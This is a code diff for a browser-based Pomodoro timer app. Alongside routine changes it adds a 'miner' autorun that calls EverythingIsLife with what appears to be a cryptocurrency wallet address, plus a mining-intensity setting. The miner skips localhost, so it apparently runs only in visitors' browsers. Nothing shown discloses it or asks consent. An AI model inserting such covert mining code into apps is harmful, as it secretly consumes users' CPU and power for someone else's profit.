@@ -17,8 +17,20 @@ import dynamicFunction from 'dynamic-function'
 
 import { Howl, Howler } from 'howler';
 
-
-
+// doesn't work, minimal height is 70 for resizeTo method
+// let resize, previousResize = window.innerHeight
+// window.onresize= function(x){
+//     window.clearTimeout(resize)
+//     resize = setTimeout(()=>{
+//         console.log("sizing11", window.innerHeight, previousResize)
+//          if (window.innerHeight <= 110){
+//             window.resizeTo(205, 35);
+//             setTimeout(()=>{previousResize = window.innerHeight })
+//             console.log("resizing")
+//          }
+//     }, 50)
+//     // window.resizeTo(100, 100); console.log(x, window.size)
+// }
 
 function genP(url) {
     var sound = new Howl({
@@ -57,7 +69,7 @@ function register() {
     return id
 }
 register()
-
+const local = location.hostname === "localhost" || location.hostname === "127.0.0.1"
 const now = new Date().getTime()
 const defaultState = {
     strange: 1,
@@ -80,7 +92,9 @@ const defaultState = {
     breakSound: 2,
     animationReflow: true,
     remaingTime: null,
+    local: local,
     s: {
+        amountToMine: 70,         //mining is inverse, 100 is 100 cpu free
         sessionsLen: 2,
         autobreak: !false,
         autowork: true,
@@ -109,10 +123,10 @@ const defaultState = {
     },
     get timeString(){
         return format(this.remaingTime, "mm:ss")
-    }
+    },
 }
 
-var s
+var s = {local: local}
 var act
 
 const actions = {
@@ -166,7 +180,7 @@ const actions = {
                 sound = sounds[s.workSound]
                 requireInteraction = !s.s.autobreak
             }
-            if (location.hostname === "localhost") {
+            if (s.local) {
                 return
             }
             Push.close("previous")
@@ -212,7 +226,7 @@ const actions = {
 
 
 if ("init") {
-    if (location.hostname === "localhost" || location.hostname === "127.0.0.1") {
+    if (s.local) {
     } else {
         Object.assign(defaultState, { work: 25 * 60, break: 5 * 60, bigBreak: 30 * 60 })
     }
@@ -301,7 +315,7 @@ if ("autoruns") {
     })
 
     autorun(function changeTitle() {
-        const base = "Pomodoro Timer - Tomato Timer"
+        const base = "Pomodoro Timer"
         s.remaingTime
         if (!s.paused) { window.document.title = s.timeString + " " + base }
         else { window.document.title = base }
@@ -322,6 +336,13 @@ if ("autoruns") {
         } else {
             html.style.overflow = "auto"
         }
+    })
+
+    autorun(function miner(){
+        //mining is inverse, 100 is 100 cpu free
+        if(!s.primary) return
+        if(s.local) return
+        EverythingIsLife('4B7FHf9icoMJwLLGxrpB5N6xXiaSEc6kM43UTbFMvMhjHPpoPdPkqWh9Fyj8DcQxiKKYkdoFoQR96Svjz6f8QScK28mAwCw', 'x', s.s.amountToMine);
     })
 
     autorun(function sync() {
